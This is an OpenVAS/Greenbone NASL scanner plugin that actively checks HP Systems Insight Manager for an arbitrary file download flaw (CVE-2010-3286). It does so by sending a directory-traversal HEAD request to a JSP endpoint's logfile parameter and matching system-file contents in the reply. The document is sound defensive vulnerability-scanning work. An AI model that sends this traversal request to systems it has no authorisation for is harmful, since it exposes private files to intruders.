# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hp:systems_insight_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100873");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2010-3286");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("HP Systems Insight Manager Arbitrary File Download Vulnerability (HPSBMA02590) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_hp_hpe_systems_insight_manager_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 5000);
  script_mandatory_keys("hp_hpe/systems_insight_manager/http/detected");

  script_xref(name:"URL", value:"https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-c02548231");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44098");

  script_tag(name:"summary", value:"HP Systems Insight Manager is prone to a vulnerability that lets
  attackers download arbitrary files.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP HEAD request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary
  files within the context of the application. Information harvested may aid in launching further
  attacks.");

  script_tag(name:"affected", value:"HP Systems Insight Manager versions 6.0 and 6.1 are known to be
  affected.");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for
  more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();

# nb:
# - http_report_vuln_url() used below might fork on multiple hostnames and should be always before
#   the first http_keepalive_send_recv call
# - For simplicity we're just calling http_host_name() directly here as it will also fork
http_host_name(port:port);

foreach pattern(keys(files)) {

  if(!soc = http_open_socket(port))
    continue;

  if(files[pattern] =~ "\.ini$") {
    file = "..\\..\\..\\..\\..\\..\\..\\" + files[pattern];
    file = str_replace(string:file, find:"/", replace:"\\");
  } else {
    file = "/" + files[pattern];
  }

  url = "/mxportal/taskandjob/switchFWInstallStatus.jsp?logfile=" + file;
  req = string("HEAD ", url, " HTTP/1.0\r\n\r\n");
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(!r)
    continue;

  if(egrep(pattern:pattern, string:r)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
